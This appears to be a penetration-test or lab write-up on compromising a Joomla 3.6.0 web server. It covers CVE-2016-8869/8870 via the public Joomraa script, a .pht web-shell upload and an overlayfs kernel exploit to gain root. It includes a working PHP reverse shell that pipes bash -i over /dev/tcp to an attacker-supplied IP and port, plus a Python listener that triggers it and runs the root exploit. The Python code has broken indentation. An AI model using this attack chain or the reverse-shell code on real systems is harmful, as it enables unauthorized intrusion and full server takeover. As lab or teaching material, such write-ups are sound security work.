Which apps are vulnerable and why? How can you prove it? What did you use to show that?

We discovered that web-server use joomla CMS. To determined the installed version of joomla we used the Metasploit scanner (auxiliary/scanner/http/joomla_version)

The installed version of joomla CMS is 3.6.0, This version is affected by the CVE-2016-8869 vulnerability:

The register method in the UsersModelRegistration class in controllers/user.php in the Users component in Joomla! before 3.6.4 allows remote attackers to gain privileges by leveraging incorrect use of unfiltered data when registering on a site.

and CVE-2016-8870:

The register method in the UsersModelRegistration class in controllers/user.php in the Users component in Joomla! before 3.6.4, when registration has been disabled, allows remote attackers to create user accounts by leveraging failure to check the Allow User Registration configuration setting.

And then we used another Metasploit plugin to check if the target was exploitable by this vulnerability.

At this moment we were sure that the target is vulnerable to this exploit.

What are the attack vectors (CVE or CWE of the vulnerability, public exploit used) and what steps is required to attack?

As we have stated before the target is vulnerable to the CVE-2016-8869 and CVE-2016-8870, we found an online script that uses this vulnerability and also utilize a default misconfiguration of the allowed file types to be uploaded
Joomraa script:
https://github.com/XiphosResearch/exploits/tree/master/Joomraa

As stated in the description in the script, The regex to match the allowed file extensions include “.pht”.
according to file-extensions.org

The PHT file stores HTML page that includes a PHP script, dynamically generates HTML, often by accessing database information.

So we can create a revere php web shell and uses the script to upload it to the target web server.

After successfully exploiting the target machine we got a “www-data” permission only, After some investigation on the target machine we found that the target uses an old kernel, specifically 3.13, This version have a local privilege escalation exploit as in exploit-db Linux Kernel 3.13.0 < 3.19 ‘overlayfs’ Local Privilege Escalation

after compiling the source code on the target machine, We got a root privilege on the target system, Next step will be creating a dynamic reverse shell that will work from any port and to any ip address, so we created this small php file.

<?= shell_exec("/bin/bash -c '/bin/bash -i > /dev/tcp/" . $_POST['ip'] . "/" . $_POST['port'] ." 0<&1 2>&1' &"); ?>

This php page accepts two POST parameters, The first one is the ip address, While the second one is the port number, After that it will start bash in interactive mode and connect to the ip address and the port number “/dev/tcp/IP_ADDRESS/PORT”.
And finally it will redirect the STDOUT of the remote connection as STDIN of bash, And the STDOUT of bash as the STDIN of the remote connection, By that we will get a good reverse shell.

From our side we wrote a python script that will does the post request and starts listing for the incoming connection.

import socket
import time
import requests
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', int(sys.argv[2])))
s.listen(5)
try:
  r = requests.post("URL", data={'ip': sys.argv[1],'port': sys.argv[2]},timeout=2)
except requests.exceptions.Timeout:
  pass
time.sleep(.5)
def interact(sock):
command=''
  sock.send("./xxx" + '\n')
  time.sleep(.5)
  sock.recv(0x10000)
  while(1):
      command=raw_input('$ ')
      sock.send(command + '\n')
      time.sleep(.5)
      print '\n'.join(sock.recv(0x10000).split('\n')[:-1])
  #print sock.recv(0x10000).split('\n')
  return
interact(s.accept()[0])

This pyton script do a post request to the our php shell and through an exception after 2 seconds. This is because the php page will maintain the connection until the reverse shell connection is terminated, After that we start the interact function which will send a command to execute a script called “xxx”, This is out privilege escalation compiled exploit, And then waits for an input from the attacker side to send it to the target and get the result back from target.

By that we manage to get a dynamic reverse shell on the target web server.
